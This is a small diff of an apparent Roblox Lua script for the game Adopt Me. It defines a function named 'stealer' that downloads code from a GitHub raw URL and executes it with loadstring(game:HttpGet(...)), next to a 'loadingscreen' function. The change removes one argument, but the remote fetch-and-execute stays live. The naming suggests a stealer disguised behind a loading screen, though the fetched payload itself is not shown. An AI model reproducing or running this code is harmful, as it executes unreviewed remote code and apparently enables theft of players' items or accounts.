@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptshubs1/AdoptMe-Script/refs/heads/main/New-Script", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptshubs1/AdoptMe-Script/refs/heads/main/New-Script"))()
 end
 
 local function loadingscreen()
